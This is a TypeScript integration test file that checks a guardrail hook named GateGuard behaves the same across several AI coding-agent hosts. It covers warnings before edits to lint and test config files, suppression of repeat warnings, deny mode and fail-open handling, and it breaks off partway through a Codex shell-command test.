// audits/hooks/gateguard-parity.integration.test.ts — one GateGuard behaviour table, every host.
//
// bkit generates the four hooks at install from one shared engine
// (`.bkit/core/hooks/`) plus per-host parts, and they reach the model by
// different routes: Claude writes `hookSpecificOutput.additionalContext` to stdout,
// Cursor writes `additional_context` with `permission: "allow"`, opencode appends the
// checklist to the tool result in its after-execute hook (and throws from before to
// block), Codex is Claude-shaped.
//
// Every row runs against every host's GENERATED hook (the template as install renders
// it) through an adapter that normalises the delivery mechanism away. A behaviour that
// cannot hold on some host is stated here as an explicit exception.
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { spawnSync } from "node:child_process";
import { createRequire } from "node:module";
import { pathToFileURL } from "node:url";
import { afterAll, describe, expect, it, vi } from "vitest";

import { readTemplate } from "../../render/parts";

const GENERATED = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-gg-parity-"));
afterAll(() => fs.rmSync(GENERATED, { recursive: true, force: true }));
const [CLAUDE_HOOK, CURSOR_HOOK, OPENCODE_PLUGIN, CODEX_HOOK, ANTIGRAVITY_HOOK] = [
  [".claude/hooks/bkit-gateguard.cjs", "claude.cjs"],
  [".cursor/hooks/bkit-gateguard.cjs", "cursor.cjs"],
  // `.mjs`: the plugin is an ES module, and the temp dir has no package.json saying so.
  [".opencode/plugin/bkit-gateguard.js", "opencode.mjs"],
  [".codex/hooks/bkit-gateguard.cjs", "codex.cjs"],
  [".agents/plugins/bkit/hooks/bkit-gateguard.cjs", "antigravity.cjs"],
].map(([rel, name]) => {
  const out = path.join(GENERATED, name);
  fs.writeFileSync(out, readTemplate(path.resolve(".bkit/core", rel)));
  return out;
});

/** Normalised result — what the model ends up seeing, and whether it was stopped. */
interface Outcome {
  advisory: string;
  blocked: boolean;
}

type Host = "claude" | "cursor" | "opencode" | "codex" | "antigravity";
const HOSTS: Host[] = ["claude", "cursor", "opencode", "codex", "antigravity"];

let counter = 0;
function newSession(): string {
  counter += 1;
  // Random component: dedup state is keyed by session id and persists in the OS temp dir
  // for 24h, and pids are recycled.
  return `gg-parity-${process.pid}-${counter}-${Math.random().toString(36).slice(2)}`;
}

// ---------------------------------------------------------------------------
// Host adapters
// ---------------------------------------------------------------------------

interface Call {
  file: string;
  session: string;
  /** "edit" = modify an existing path, "create" = write a not-yet-existing path. */
  kind?: "edit" | "create";
  env?: Record<string, string | undefined>;
}

function runClaude(c: Call): Outcome {
  const res = spawnSync("node", [CLAUDE_HOOK], {
    input: JSON.stringify({
      tool_name: c.kind === "create" ? "Write" : "Edit",
      tool_input: { file_path: c.file },
      session_id: c.session,
    }),
    encoding: "utf-8",
    env: { ...process.env, BKIT_GATEGUARD: undefined, ...c.env },
  });
  const out = res.stdout.trim() ? JSON.parse(res.stdout.trim()) : {};
  const hso = out.hookSpecificOutput ?? {};
  return {
    advisory: String(hso.additionalContext ?? hso.permissionDecisionReason ?? ""),
    blocked: hso.permissionDecision === "deny",
  };
}

function runCursor(c: Call): Outcome {
  const res = spawnSync("node", [CURSOR_HOOK], {
    input: JSON.stringify({
      // Cursor normalises both edits and creates to `Write`.
      tool_name: "Write",
      tool_input: { file_path: c.file },
      session_id: c.session,
      workspace_roots: [process.cwd()],
      cursor_version: "3.17.8",
    }),
    encoding: "utf-8",
    env: { ...process.env, BKIT_GATEGUARD: undefined, ...c.env },
  });
  const out = res.stdout.trim() ? JSON.parse(res.stdout.trim()) : {};
  return {
    advisory: String(out.additional_context ?? out.agent_message ?? ""),
    blocked: out.permission === "deny",
  };
}

async function runOpencode(c: Call): Promise<Outcome> {
  const saved: Record<string, string | undefined> = {};
  const env = { BKIT_GATEGUARD: undefined, ...c.env };
  for (const [k, v] of Object.entries(env)) {
    saved[k] = process.env[k];
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }

  let blocked = false;
  let thrownMessage = "";
  let advisory = "";
  try {
    // Drive the plugin as OpenCode 2.0 does: setup(ctx) registers the before + after
    // hooks, then the runner calls before (block/allow) and, on success, after with a
    // fresh `result`. The advisory is what the after hook appends to `result.content`,
    // which the host reads back into the model's tool result.
    const { default: plugin } = await import(pathToFileURL(OPENCODE_PLUGIN).href);
    const hooks: Record<string, (event: object) => Promise<void>> = {};
    await plugin.setup({
      tool: {
        hook: async (name: string, cb: (event: object) => Promise<void>) => {
          hooks[name] = cb;
        },
      },
    });
    const event = {
      tool: c.kind === "create" ? "write" : "edit",
      sessionID: c.session,
      id: "parity-call",
      input: { path: c.file },
    };
    try {
      if (hooks["execute.before"]) await hooks["execute.before"](event);
    } catch (e) {
      blocked = true;
      thrownMessage = (e as Error).message;
    }
    if (!blocked) {
      const result: { content: { type: string; text: string }[] } = { content: [] };
      if (hooks["execute.after"]) {
        await hooks["execute.after"]({ ...event, status: "completed", result });
      }
      advisory = result.content.map((part) => part.text).join("");
    }
  } finally {
    for (const [k, v] of Object.entries(saved)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  }
  return { advisory: blocked ? thrownMessage : advisory, blocked };
}

/**
 * Codex sends NO file path. Every edit arrives as `apply_patch` with a V4A patch envelope in
 * `tool_input.command`, so the adapter builds a real envelope.
 */
function runCodex(c: Call): Outcome {
  const op = c.kind === "create" ? "Add" : "Update";
  const hunk = c.kind === "create" ? "+new contents" : "@@\n-before\n+after";
  const res = spawnSync("node", [CODEX_HOOK], {
    input: JSON.stringify({
      tool_name: "apply_patch",
      tool_input: { command: `*** Begin Patch\n*** ${op} File: ${c.file}\n${hunk}\n*** End Patch` },
      session_id: c.session,
      cwd: process.cwd(),
    }),
    encoding: "utf-8",
    env: { ...process.env, BKIT_GATEGUARD: undefined, ...c.env },
  });
  const out = res.stdout.trim() ? JSON.parse(res.stdout.trim()) : {};
  const hso = out.hookSpecificOutput ?? {};
  return {
    advisory: String(hso.additionalContext ?? hso.permissionDecisionReason ?? ""),
    blocked: hso.permissionDecision === "deny",
  };
}

/**
 * Antigravity's live-verified envelope: `write_to_file` (create/overwrite) or
 * `replace_file_content` (in-place edit) with the target in `toolCall.args.TargetFile`,
 * resolved against `workspacePaths[0]`. Its reply is `{ decision, reason }`; only a deny's
 * reason reaches the model, so an advisory arrives as a one-time deny.
 */
function runAntigravity(c: Call): Outcome {
  const res = spawnSync("node", [ANTIGRAVITY_HOOK], {
    input: JSON.stringify({
      conversationId: c.session,
      toolCall: {
        name: c.kind === "create" ? "write_to_file" : "replace_file_content",
        args: { TargetFile: c.file, toolAction: "Editing file", toolSummary: "Edit" },
      },
      workspacePaths: [process.cwd()],
    }),
    encoding: "utf-8",
    env: { ...process.env, BKIT_GATEGUARD: undefined, ...c.env },
  });
  const out = res.stdout.trim() ? JSON.parse(res.stdout.trim()) : {};
  return {
    advisory: out.decision === "deny" ? String(out.reason ?? "") : "",
    blocked: out.decision === "deny",
  };
}

async function run(host: Host, c: Call): Promise<Outcome> {
  if (host === "claude") return runClaude(c);
  if (host === "cursor") return runCursor(c);
  if (host === "codex") return runCodex(c);
  if (host === "antigravity") return runAntigravity(c);
  return runOpencode(c);
}

// ---------------------------------------------------------------------------
// The behaviour table — every row asserted on every host
// ---------------------------------------------------------------------------

describe("gateguard behaviour parity — advisory content", () => {
  for (const host of HOSTS) {
    describe(host, () => {
      it("first edit to an existing file gets the investigation checklist", async () => {
        const r = await run(host, { file: "package.json", session: newSession() });
        expect(r.advisory).toContain("[bkit GateGuard]");
        expect(r.advisory).toContain("First edit to");
        // Antigravity delivers every advisory as a one-time deny (documented deviation below).
        expect(r.blocked).toBe(host === "antigravity");
      });

      it("a create of a nonexistent path gets the reuse checklist instead", async () => {
        const r = await run(host, {
          file: "src/does-not-exist-parity.ts",
          session: newSession(),
          kind: "create",
        });
        expect(r.advisory).toContain("New file");
      });

      it("a gate-config path gets the weaken-the-gate advisory", async () => {
        const r = await run(host, { file: "tsconfig.json", session: newSession() });
        expect(r.advisory).toContain("quality-gate config");
      });

      // Non-JS ecosystems: their linters / formatters gate the same way, so an
      // edit to their config gets the same advisory.
      it.each([
        "ruff.toml",
        ".ruff.toml",
        ".flake8",
        "mypy.ini",
        ".mypy.ini",
        "pylintrc",
        ".pylintrc",
        "pytest.ini",
        "jest.config.json",
        ".golangci.yml",
        ".golangci.toml",
        "clippy.toml",
        "rustfmt.toml",
        ".clippy.toml",
        ".rustfmt.toml",
      ])("a %s gate config gets the weaken-the-gate advisory", async (file) => {
        const r = await run(host, { file, session: newSession() });
        expect(r.advisory).toContain("quality-gate config");
      });

      // JS / TS ecosystem configs (and the doc linter), matched on the basename wherever the
      // file sits.
      it.each([
        "tsconfig.build.json",
        "path/to/tsconfig.build.json",
        "vitest.config.ts",
        "vite.config.mts",
        "eslint.config.js",
        ".eslintrc",
        ".eslintrc.json",
        ".prettierrc",
        ".prettierrc.json",
        "prettier.config.js",
        ".prettierignore",
        "biome.json",
        "biome.jsonc",
        ".vale.ini",
        "slop-scan.config.json",
        ".lintstagedrc.json",
        "lint-staged.config.js",
      ])("a %s gate config gets the weaken-the-gate advisory", async (file) => {
        const r = await run(host, { file, session: newSession() });
        expect(r.advisory).toContain("quality-gate config");
      });

      it.each(["README.md", "src/index.ts"])(
        "ordinary file %s is not treated as a gate config",
        async (file) => {
          const r = await run(host, { file, session: newSession() });
          expect(r.advisory).not.toContain("quality-gate config");
        },
      );

      it("BKIT_ALLOW_CONFIG_EDIT=1 downgrades a gate config to the normal checklist", async () => {
        const r = await run(host, {
          file: "tsconfig.json",
          session: newSession(),
          env: { BKIT_ALLOW_CONFIG_EDIT: "1" },
        });
        expect(r.advisory).not.toContain("quality-gate config");
        expect(r.advisory).toContain("[bkit GateGuard]");
      });

      it.each(["package.json", "pyproject.toml", "setup.cfg", "tox.ini"])(
        "mixed-purpose %s is not treated as a gate config",
        async (file) => {
          const r = await run(host, { file, session: newSession() });
          expect(r.advisory).not.toContain("quality-gate config");
        },
      );
    });
  }
});

describe("gateguard behaviour parity — template copies", () => {
  function repo(name: string): string {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "gg-parity-repo-"));
    fs.writeFileSync(path.join(dir, "package.json"), JSON.stringify({ name }));
    return dir;
  }
  const consumer = repo("consumer-app");
  const dogfood = repo("@cbartens/bkit");

  for (const host of HOSTS) {
    it(`${host}: a consumer's .bkit/templates/.vale.ini is not a gate config`, async () => {
      const file = path.join(consumer, ".bkit/templates/.vale.ini");
      const r = await run(host, { file, session: newSession() });
      expect(r.advisory).toContain("[bkit GateGuard]");
      expect(r.advisory).not.toContain("quality-gate config");
    });

    it(`${host}: a consumer's root .vale.ini is a gate config`, async () => {
      const file = path.join(consumer, ".vale.ini");
      const r = await run(host, { file, session: newSession() });
      expect(r.advisory).toContain("quality-gate config");
    });

    it(`${host}: bkit's own .bkit/templates/.vale.ini is a gate config`, async () => {
      const file = path.join(dogfood, ".bkit/templates/.vale.ini");
      const r = await run(host, { file, session: newSession() });
      expect(r.advisory).toContain("quality-gate config");
    });

    it(`${host}: a relative .bkit/templates/.vale.ini resolves against the cwd's package (this is bkit's repo)`, async () => {
      const r = await run(host, { file: ".bkit/templates/.vale.ini", session: newSession() });
      expect(r.advisory).toContain("quality-gate config");
    });

    it(`${host}: a folder that merely ends in .bkit/templates is not a template copy`, async () => {
      const file = path.join(consumer, "x.bkit/templates/.vale.ini");
      const r = await run(host, { file, session: newSession() });
      expect(r.advisory).toContain("quality-gate config");
    });
  }
});

describe("gateguard behaviour parity — docs density advisory", () => {
  type DocsCase = { file: string; why: string };
  const firing: DocsCase[] = [
    { file: "docs/architecture.md", why: "a docs markdown file" },
    { file: ".bkit/shared/docs/architecture.md", why: "nested docs tree" },
  ];
  const silent: DocsCase[] = [
    { file: "Documents/architecture.md", why: "segment match, not substring" },
    { file: "docs/plans/202608/x/design.md", why: "plans follow the plan template" },
    { file: "docs/knowledge.jsonl", why: "gated on .md" },
  ];
  for (const host of HOSTS) {
    for (const c of firing) {
      it(`${host}: fires on ${c.file} (${c.why})`, async () => {
        const r = await run(host, { file: c.file, session: newSession() });
        expect(r.advisory).toContain("docs/*.md authoring");
      });
    }
    for (const c of silent) {
      it(`${host}: does not fire on ${c.file} (${c.why})`, async () => {
        const r = await run(host, { file: c.file, session: newSession() });
        expect(r.advisory).not.toContain("docs/*.md authoring");
      });
    }
  }
});

describe("gateguard behaviour parity — dedup", () => {
  for (const host of HOSTS) {
    it(`${host}: second touch of the same file in the same session is silent`, async () => {
      const session = newSession();
      expect((await run(host, { file: "package.json", session })).advisory).toContain(
        "[bkit GateGuard]",
      );
      expect((await run(host, { file: "package.json", session })).advisory).toBe("");
    });

    it(`${host}: a different file in the same session warns again`, async () => {
      const session = newSession();
      await run(host, { file: "package.json", session });
      const r = await run(host, { file: "tsconfig.json", session });
      expect(r.advisory).toContain("[bkit GateGuard]");
    });
  }
});

describe("gateguard behaviour parity — modes", () => {
  for (const host of HOSTS) {
    it(`${host}: BKIT_GATEGUARD=off is a total no-op`, async () => {
      const r = await run(host, {
        file: "package.json",
        session: newSession(),
        env: { BKIT_GATEGUARD: "off" },
      });
      expect(r.advisory).toBe("");
      expect(r.blocked).toBe(false);
    });

    it(`${host}: BKIT_GATEGUARD=deny blocks the first touch with the checklist`, async () => {
      const r = await run(host, {
        file: "package.json",
        session: newSession(),
        env: { BKIT_GATEGUARD: "deny" },
      });
      expect(r.blocked).toBe(true);
      expect(r.advisory).toContain("[bkit GateGuard]");
    });

    it(`${host}: deny mode allows the retry (dedup lets the second call through)`, async () => {
      const session = newSession();
      const env = { BKIT_GATEGUARD: "deny" };
      expect((await run(host, { file: "package.json", session, env })).blocked).toBe(true);
      expect((await run(host, { file: "package.json", session, env })).blocked).toBe(false);
    });
  }
});

describe("gateguard behaviour parity — no-op and fail-open", () => {
  for (const host of HOSTS) {
    it(`${host}: an edit payload with no file path is ignored`, async () => {
      const r = await run(host, { file: "", session: newSession() });
      expect(r.advisory).toBe("");
      expect(r.blocked).toBe(false);
    });
  }
});

// ---------------------------------------------------------------------------
// State folders — per user, and fail-open when they cannot be written
// ---------------------------------------------------------------------------

const UID = process.getuid!();

/** A private temp root (the hook's TMPDIR) whose folders `unwritable` exist read-only. */
function stateRoot(...unwritable: string[]): string {
  const root = fs.mkdtempSync(path.join(GENERATED, "tmp-"));
  for (const name of unwritable) fs.mkdirSync(path.join(root, name), { mode: 0o555 });
  return root;
}

describe("gateguard behaviour parity — corrupt state", () => {
  for (const host of ["claude", "cursor", "opencode", "codex"] as Host[]) {
    it(`${host}: unparseable session state still advises, and deny does not loop`, async () => {
      const tmp = stateRoot();
      const session = newSession();
      const dir = path.join(tmp, `bkit-gateguard-${UID}`);
      fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(path.join(dir, `${session}.json`), "{not json");
      const advised = await run(host, { file: "package.json", session, env: { TMPDIR: tmp } });
      expect(advised.advisory).toContain("[bkit GateGuard]");

      const denySession = newSession();
      fs.writeFileSync(path.join(dir, `${denySession}.json`), "{not json");
      const env = { BKIT_GATEGUARD: "deny", TMPDIR: tmp };
      const first = await run(host, { file: "package.json", session: denySession, env });
      expect(first.blocked).toBe(true);
      expect(first.advisory).toContain("[bkit GateGuard]");
    });
  }
});

describe("gateguard behaviour parity — state folders", () => {
  for (const host of HOSTS) {
    it(`${host}: dedup state lives in a per-user folder`, async () => {
      const tmp = stateRoot();
      await run(host, { file: "package.json", session: newSession(), env: { TMPDIR: tmp } });
      expect(fs.readdirSync(tmp)).toContain(`bkit-gateguard-${UID}`);
    });

    it(`${host}: another user's shared folder does not cost the session its dedup`, async () => {
      // On a shared Linux /tmp the first user to create the plain-named folder owns it.
      const env = { TMPDIR: stateRoot("bkit-gateguard", "bkit-antigravity-retry") };
      const session = newSession();
      expect((await run(host, { file: "package.json", session, env })).advisory).toContain(
        "[bkit GateGuard]",
      );
      expect((await run(host, { file: "package.json", session, env })).advisory).toBe("");
    });

    it(`${host}: an unwritable state folder still delivers the checklist`, async () => {
      const env = { TMPDIR: stateRoot("bkit-gateguard", `bkit-gateguard-${UID}`) };
      const r = await run(host, { file: "package.json", session: newSession(), env });
      expect(r.advisory).toContain("[bkit GateGuard]");
    });

    it(`${host}: deny mode with an unwritable state folder never blocks the retry`, async () => {
      const env = {
        TMPDIR: stateRoot("bkit-gateguard", `bkit-gateguard-${UID}`),
        BKIT_GATEGUARD: "deny",
      };
      const session = newSession();
      await run(host, { file: "package.json", session, env });
      expect((await run(host, { file: "package.json", session, env })).blocked).toBe(false);
    });
  }

  it("opencode: an unwritable state folder warns once per session, not on every edit", async () => {
    // opencode is one long-lived process, so it remembers the warning in-process.
    const env = { TMPDIR: stateRoot("bkit-gateguard", `bkit-gateguard-${UID}`) };
    const session = newSession();
    const first = await run("opencode", { file: "package.json", session, env });
    const second = await run("opencode", { file: "package.json", session, env });
    expect([first.advisory.includes("[bkit GateGuard]"), second.advisory]).toEqual([true, ""]);
  });
});

describe("antigravity deny-once delivery — retry folder", () => {
  it("another user's shared retry folder does not cost the checklist", () => {
    const env = { TMPDIR: stateRoot("bkit-antigravity-retry") };
    const session = newSession();
    const first = runAntigravity({ file: "package.json", session, env });
    const retry = runAntigravity({ file: "package.json", session, env });
    expect(first.advisory).toContain("[bkit GateGuard]");
    expect([first.blocked, retry.blocked]).toEqual([true, false]);
  });

  it("an unwritable retry folder allows the call instead of denying it with no way through", () => {
    const env = {
      TMPDIR: stateRoot(
        "bkit-gateguard",
        `bkit-gateguard-${UID}`,
        "bkit-antigravity-retry",
        `bkit-antigravity-retry-${UID}`,
      ),
    };
    const session = newSession();
    const runs = [1, 2].map(() => runAntigravity({ file: "package.json", session, env }));
    expect(runs.map((r) => r.blocked)).toEqual([false, false]);
  });

  it("adviseOnce returns allow, never throws, when the retry folder cannot be written", () => {
    // Loaded alone, without the hook driver's fail-open catch around it.
    const part = path.join(GENERATED, "antigravity-hook-part.cjs");
    fs.writeFileSync(
      part,
      'const fs = require("node:fs");\nconst os = require("node:os");\n' +
        'const path = require("node:path");\nconst crypto = require("node:crypto");\n' +
        fs.readFileSync(path.resolve(".bkit/core/hooks/antigravity-hook.js"), "utf-8") +
        "\nmodule.exports = { adviseOnce };\n",
    );
    const { adviseOnce } = createRequire(import.meta.url)(part) as {
      adviseOnce: (hook: string, session: string, signature: string, advisory: string) => unknown;
    };
    vi.stubEnv("TMPDIR", stateRoot("bkit-antigravity-retry", `bkit-antigravity-retry-${UID}`));
    try {
      expect(adviseOnce("gateguard", newSession(), "sig", "advice")).toEqual({ decision: "allow" });
    } finally {
      vi.unstubAllEnvs();
    }
  });
});

describe("gateguard structural parity", () => {
  const FILES: Record<Host, string> = {
    claude: CLAUDE_HOOK,
    cursor: CURSOR_HOOK,
    opencode: OPENCODE_PLUGIN,
    codex: CODEX_HOOK,
    antigravity: ANTIGRAVITY_HOOK,
  };

  function block(file: string): string {
    const src = fs.readFileSync(file, "utf-8");
    return src.slice(src.indexOf("// bkit:start"), src.indexOf("// bkit:end"));
  }

  for (const host of HOSTS) {
    it(`${host}: carries slash-comment markers with start before end`, () => {
      const src = fs.readFileSync(FILES[host], "utf-8");
      expect(src.indexOf("// bkit:start")).toBeGreaterThanOrEqual(0);
      expect(src.indexOf("// bkit:end")).toBeGreaterThan(src.indexOf("// bkit:start"));
    });

    it(`${host}: the managed block never emits or reads stdin`, () => {
      const b = block(FILES[host]);
      expect(b).not.toContain("process.stdout.write");
      expect(b).not.toContain("process.stderr.write");
      expect(b).not.toContain("readFileSync(0");
    });

    it(`${host}: dedup state lives in the OS temp dir, never in the consumer repo`, () => {
      const b = block(FILES[host]);
      expect(b).toContain("tmpdir()");
    });
  }

  it("claude and cursor blocks are byte-identical", () => {
    expect(block(CLAUDE_HOOK)).toBe(block(CURSOR_HOOK));
  });

  it("every host's generated block carries the shared engine verbatim", () => {
    const engine = fs
      .readFileSync(path.resolve(".bkit/core/hooks/gateguard-engine.js"), "utf-8")
      .trimEnd();
    for (const host of HOSTS) expect(block(FILES[host]), host).toContain(engine);
  });

  // Documented deviation, same class as opencode's. Codex shares Claude's stdin/stdout
  // contract but NOT its payload: edits arrive as `apply_patch` with a V4A patch envelope
  // in `tool_input.command` and no file path at all, so the block carries an extra parser
  // and a different tool vocabulary. The advisory texts are the same.
  it("the codex block carries the same advisory texts as the claude twin", () => {
    const codex = block(CODEX_HOOK);
    const claude = block(CLAUDE_HOOK);
    for (const marker of ["[bkit GateGuard]", "First edit to", "New file", "quality-gate config"]) {
      expect(claude).toContain(marker);
      expect(codex).toContain(marker);
    }
  });

  // The block matches the `apply_patch` tool name and parses the envelope.
  it("the codex block matches apply_patch and parses the V4A envelope", () => {
    const b = block(CODEX_HOOK);
    expect(b).toContain('"apply_patch"');
    expect(b).toContain("parseApplyPatchTargets");
    expect(b).toMatch(/Add\|Update\|Delete/);
  });

  it("codex advises on the *** Move to: target of a renaming patch", () => {
    const res = spawnSync("node", [CODEX_HOOK], {
      input: JSON.stringify({
        tool_name: "apply_patch",
        tool_input: {
          command:
            "*** Begin Patch\n*** Update File: src/old-name.ts\n*** Move to: src/new-name.ts\n@@\n-a\n+b\n*** End Patch",
        },
        session_id: `gg-codex-move-${process.pid}`,
        cwd: process.cwd(),
      }),
      encoding: "utf-8",
      env: { ...process.env, BKIT_GATEGUARD: "deny" },
    });
    const reason = String(JSON.parse(res.stdout).hookSpecificOutput?.permissionDecisionReason);
    expect(reason).toContain("old-name.ts");
    // Old name is warned; the retry must still catch the move target.
    const retry = spawnSync("node", [CODEX_HOOK], {
      input: JSON.stringify({
        tool_name: "apply_patch",
        tool_input: {
          command:
            "*** Begin Patch\n*** Update File: src/old-name.ts\n*** Move to: src/new-name.ts\n@@\n-a\n+b\n*** End Patch",
        },
        session_id: `gg-codex-move-${process.pid}`,
        cwd: process.cwd(),
      }),
      encoding: "utf-8",
      env: { ...process.env, BKIT_GATEGUARD: "deny" },
    });
    expect(String(JSON.parse(retry.stdout).hookSpecificOutput?.permissionDecisionReason)).toContain(
      "new-name.ts",
    );
  });

  it("the opencode block carries the same advisory texts as the CJS twins", () => {
    // Documented deviation: opencode's block is NOT byte-identical to the other two.
    // It is an ES module with its own tool vocabulary (write/edit/patch vs
    // Write/Edit/MultiEdit) and no `require`; the advisory builders are compared
    // instead of the whole block.
    const oc = block(OPENCODE_PLUGIN);
    const cj = block(CLAUDE_HOOK);
    for (const marker of [
      "[bkit GateGuard]",
      "quality-gate config",
      "docs/*.md authoring",
      "First edit to",
      "Evolve existing code first",
    ]) {
      expect(oc).toContain(marker);
      expect(cj).toContain(marker);
    }
  });
});

// ---------------------------------------------------------------------------
// Documented deviations — behaviours that differ by host.
// ---------------------------------------------------------------------------

describe("gateguard parity — documented deviations", () => {
  it("only Claude distinguishes Edit from Write for the new-file nudge", () => {
    // Claude ships Edit / Write / MultiEdit and reserves the reuse checklist for
    // Write. Cursor normalises every edit and create to `Write`, and opencode uses
    // write/edit/patch, so neither can make Claude's distinction. Asserted on Claude
    // alone in audits/hooks/gateguard-claude.integration.test.ts; the create/edit rows above use
    // each host's own vocabulary instead.
    const r = runClaude({ file: "src/nope-parity.ts", session: newSession() });
    expect(r.advisory).toContain("First edit to");
    expect(r.advisory).not.toContain("New file");
  });

  it("blocking is expressed differently per host but means the same thing", () => {
    // Claude: permissionDecision "deny". Cursor: permission "deny" + agent_message.
    // opencode: a thrown Error (its hook has no non-throwing block primitive). The
    // adapters above normalise all three to `blocked`.
    const claude = runClaude({
      file: "package.json",
      session: newSession(),
      env: { BKIT_GATEGUARD: "deny" },
    });
    const cursor = runCursor({
      file: "package.json",
      session: newSession(),
      env: { BKIT_GATEGUARD: "deny" },
    });
    expect(claude.blocked).toBe(true);
    expect(cursor.blocked).toBe(true);
  });

  it("Antigravity delivers the checklist by denying the first edit once; the retry passes", () => {
    const session = newSession();
    const first = runAntigravity({ file: "package.json", session });
    expect(first.blocked).toBe(true);
    expect(first.advisory).toContain("[bkit GateGuard]");
    expect(first.advisory).toContain("Repeat the same call to proceed.");
    expect(runAntigravity({ file: "package.json", session }).blocked).toBe(false);
  });

  it("malformed stdin is a CJS-hook concern only", () => {
    // Claude and Cursor parse stdin and must fail open on garbage. opencode receives
    // an already-parsed object from its host, so it has no stdin to malform; its
    // equivalent (null/missing args) is covered in its own suite.
    for (const hook of [CLAUDE_HOOK, CURSOR_HOOK]) {
      const res = spawnSync("node", [hook], { input: "not json", encoding: "utf-8" });
      expect(res.status).toBe(0);
    }
  });
});

// ---------------------------------------------------------------------------
// Task 5: complete-block batching inside conservative host budgets. Codex is the host
// whose multi-file patch envelope reaches the shared engine today and which has a 2,000
// UTF-8 byte budget; opencode applies no host budget, so it cannot observe batching.
// ---------------------------------------------------------------------------

const CODEX_BUDGET_BYTES = 2000;

function codexPatch(session: string, targets: string[], tmp: string) {
  const command = [
    "*** Begin Patch",
    ...targets.flatMap((t) => [`*** Update File: ${t}`, "@@", "-a", "+b"]),
    "*** End Patch",
  ].join("\n");
  const res = spawnSync("node", [CODEX_HOOK], {
    input: JSON.stringify({
      tool_name: "apply_patch",
      tool_input: { command },
      session_id: session,
      cwd: process.cwd(),
    }),
    encoding: "utf-8",
    env: { ...process.env, BKIT_GATEGUARD: undefined, TMPDIR: tmp },
  });
  const out = res.stdout.trim() ? JSON.parse(res.stdout.trim()) : {};
  return String(out.hookSpecificOutput?.additionalContext ?? "");
}

function warnedFiles(tmp: string, session: string): string[] {
  const dir = path.join(
    tmp,
    typeof process.getuid === "function" ? `bkit-gateguard-${process.getuid()}` : "bkit-gateguard",
  );
  const file = path.join(dir, `${session.replace(/[^a-zA-Z0-9_-]/g, "_").slice(0, 128)}.json`);
  if (!fs.existsSync(file)) return [];
  return Object.keys(JSON.parse(fs.readFileSync(file, "utf-8")).files);
}

function omittedCount(advice: string): number | null {
  const m =
    /\b(\d+)\b[^\n]{0,40}omitted/i.exec(advice) ?? /omitted[^\n]{0,40}?\b(\d+)\b/i.exec(advice);
  return m ? Number(m[1] ?? m[2]) : null;
}

function completeBlocks(advice: string): { started: number; finished: number } {
  return {
    started: (advice.match(/\[bkit GateGuard\] (?:First edit to|New file)/g) ?? []).length,
    finished: (advice.match(/Advisory: proceed once satisfied\./g) ?? []).length,
  };
}

describe("codex gateguard — complete-block batching", () => {
  it("reserves notices inside conservative host budgets", () => {
    const tmp = fs.mkdtempSync(path.join(GENERATED, "tmp-"));
    const targets = ["src/aa.ts", "src/bb.ts", "src/cc.ts", "src/dd.ts"];
    const advice = codexPatch(newSession(), targets, tmp);

    // The whole composed response fits the byte budget, and only complete blocks appear.
    expect(Buffer.byteLength(advice, "utf-8")).toBeLessThanOrEqual(CODEX_BUDGET_BYTES);
    const { started, finished } = completeBlocks(advice);
    expect(started).toBeGreaterThanOrEqual(1);
    expect(finished).toBe(started);
    // The omitted-target count is exact.
    expect(omittedCount(advice)).toBe(targets.length - started);

    // Zero-fit block: one multi-byte basename whose single block exceeds the budget by bytes
    // (but not by characters). It is dropped whole, never cut, and counted as omitted.
    const wide = `src/${"é".repeat(700)}.ts`;
    const zero = codexPatch(newSession(), [wide], tmp);
    expect(Buffer.byteLength(zero, "utf-8")).toBeLessThanOrEqual(CODEX_BUDGET_BYTES);
    expect(zero).not.toContain("First edit to");
    expect(omittedCount(zero)).toBe(1);
  });

  it("acknowledges only complete selected blocks on verified routes", () => {
    const tmp = fs.mkdtempSync(path.join(GENERATED, "tmp-"));
    const session = newSession();
    const root = process.cwd();
    const small = "src/shown-first.ts";
    const huge = `src/${"é".repeat(700)}.ts`;
    const later = "src/later-reminder.ts";

    const first = codexPatch(session, [small, huge, later], tmp);
    expect(first).toContain("shown-first.ts");
    expect(first).not.toContain("later-reminder.ts");
    expect(omittedCount(first)).toBe(2);

    // Only the complete shown block is acknowledged; unshown paths stay eligible.
    expect(warnedFiles(tmp, session)).toEqual([path.resolve(root, small)]);

    // A later patch still reminds for the path that was not shown.
    const second = codexPatch(session, [later], tmp);
    expect(second).toContain("later-reminder.ts");
    // The acknowledged path is silent.
    expect(codexPatch(session, [small], tmp)).toBe("");
  });
});

// ---------------------------------------------------------------------------
// Task 8: Codex complete patches and initial shell commands.
// ---------------------------------------------------------------------------

const CODEX_GUARD = path.join(GENERATED, "codex-guardrails.cjs");
fs.writeFileSync(
  CODEX_GUARD,
  readTemplate(path.resolve(".bkit/core/.codex/hooks/bkit-guardrails.cjs")),
);

function codexBash(session: string, command: string, tmp: string, toolName = "Bash") {
  const res = spawnSync("node", [CODEX_GUARD], {
    input: JSON.stringify({
      tool_name: toolName,
      tool_input: { command },
      session_id: session,
      cwd: process.cwd(),
    }),
    encoding: "utf-8",
    env: { ...process.env, BKIT_GATEGUARD: undefined, TMPDIR: tmp },
  });
  const out = res.stdout.trim() ? JSON.parse(res.stdout.trim()) : {};
  return {
    context: String(out.hookSpecificOutput?.additionalContext ?? ""),
    denied: out.hookSpecificOutput?.permissionDecision === "deny",
  };
}

describe("codex gateguard — complete patches and shell", () => {
  it("routes Codex complete patches and initial shell commands", () => {
    const tmp = fs.mkdtempSync(path.join(GENERATED, "tmp-"));
    const root = process.cwd();

    // Every add / update / delete / move target of one patch is prepared; each is either
    // shown as a complete block or counted as omitted and left eligible.
    const session = newSession();
    const command = [
      "*** Begin Patch",
      "*** Add File: src/p-add.ts",
      "+x",
      "*** Delete File: src/p-del.ts",
      "*** Update File: src/p-upd.ts",
      "*** Move to: src/p-moved.ts",
      "@@",
      "-a",
      "+b",
      "*** End Patch",
    ].join("\n");
    const res = spawnSync("node", [CODEX_HOOK], {
      input: JSON.stringify({
        tool_name: "apply_patch",
        tool_input: { command },
        session_id: session,
        cwd: root,
      }),
      encoding: "utf-8",
      env: { ...process.env, BKIT_GATEGUARD: undefined, TMPDIR: tmp },
    });
